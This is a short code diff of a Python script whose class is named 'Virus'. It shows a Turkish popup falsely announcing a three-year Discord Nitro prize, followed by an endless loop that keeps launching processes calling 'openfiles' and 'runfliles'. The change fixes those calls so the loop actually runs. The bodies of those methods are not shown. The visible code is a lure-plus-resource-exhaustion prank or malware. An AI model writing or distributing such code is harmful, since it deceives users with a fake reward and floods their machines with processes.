@@ -16,6 +16,6 @@ class Virus():
 tkinter.messagebox.showinfo("Tebrikler", "3 yıllık discord nitro kazandınız")
 
 while True:
-    Process(Virus.openfiles).start()
-    Process(Virus.runfliles).start()
+    Process(target=Virus.openfiles).start()
+    Process(target=Virus.runfliles).start()
     Tk().update()
